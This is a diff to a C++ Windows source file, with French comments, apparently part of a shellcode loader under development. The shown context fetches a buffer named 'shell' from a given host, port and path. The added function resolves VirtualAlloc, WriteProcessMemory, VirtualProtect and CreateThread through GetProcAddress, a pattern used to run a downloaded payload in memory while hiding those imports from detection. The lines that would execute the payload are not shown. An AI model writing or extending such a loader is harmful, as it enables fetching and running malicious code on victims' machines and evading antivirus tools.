@@ -38,7 +38,7 @@ LPSTR CheckData(HINTERNET hRequest) {
 
     } while (dwSize > 0);
 
-    return nullptr;
+    return nullptr; // retourne rien pour avoir une erreur propre si jamais 
 }
 
 LPSTR Data(const wchar_t host[], int port, const wchar_t path[]) {
@@ -72,5 +72,26 @@ LPSTR Data(const wchar_t host[], int port, const wchar_t path[]) {
 
 
     return shell;
+}
+
+// C'est pour charger toutes nos fonctions personnelle
+
+int chargerLib(ChargeDLL* chargeDLL) {
+    chargeDLL->hKernel = GetModuleHandleA("kernel32.dll");
+    if (chargeDLL->hKernel == NULL) return 0;
+
+    chargeDLL->pVirtualAlloc = (VirtualAlloc_t)GetProcAddress(chargeDLL->hKernel, "VirtualAlloc");
+    chargeDLL->pWriteProcessMemory = (WriteProcessMemory_t)GetProcAddress(chargeDLL->hKernel, "WriteProcessMemory");
+    chargeDLL->pVirtualProtect = (VirtualProtect_t)GetProcAddress(chargeDLL->hKernel, "VirtualProtect");
+    chargeDLL->pCreateThread = (CreateThread_t)GetProcAddress(chargeDLL->hKernel, "CreateThread");
+    chargeDLL->pVirtualFree = (VirtualFree_t)GetProcAddress(chargeDLL->hKernel, "VirtualFree");
+    chargeDLL->pGetCurrentProcess = (GetCurrentProcess_t)GetProcAddress(chargeDLL->hKernel, "GetCurrentProcess");
+
+    if (!chargeDLL->pVirtualAlloc || !chargeDLL->pWriteProcessMemory || !chargeDLL->pVirtualProtect ||
+        !chargeDLL->pCreateThread || !chargeDLL->pVirtualFree || !chargeDLL->pGetCurrentProcess) {
+        return 0; // Échec si une fonction manque
+    }
+
+    return 1; 
 }
 
